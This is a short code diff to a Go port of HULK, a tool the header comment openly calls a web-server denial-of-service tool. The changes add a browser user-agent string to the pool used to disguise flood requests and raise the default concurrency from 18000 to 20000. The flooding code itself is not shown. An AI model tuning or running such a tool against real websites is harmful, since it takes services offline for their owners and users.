@@ -3,6 +3,7 @@ package main
 /*
  HULK DoS tool on <strike>steroids</strike> goroutines. Just ported from Python with some improvements.
  Original Python utility by Barry Shteiman http://www.sectorix.com/2012/05/17/hulk-web-server-dos-tool/
+
  This go program licensed under GPLv3.
  Copyright Alexander I.Grafov <grafov@gmail.com>
 */
@@ -56,7 +57,8 @@ var (
 		"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)",
 		"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)",
 		"Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)",
-		"Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)"
+		"Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)",
+		"Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51",
 	}
 	cur int32
 )
@@ -92,7 +94,7 @@ func main() {
 	t := os.Getenv("HULKMAXPROCS")
 	maxproc, err := strconv.Atoi(t)
 	if err != nil {
-		maxproc = 18000
+		maxproc = 20000
 	}
 
 	u, err := url.Parse(site)
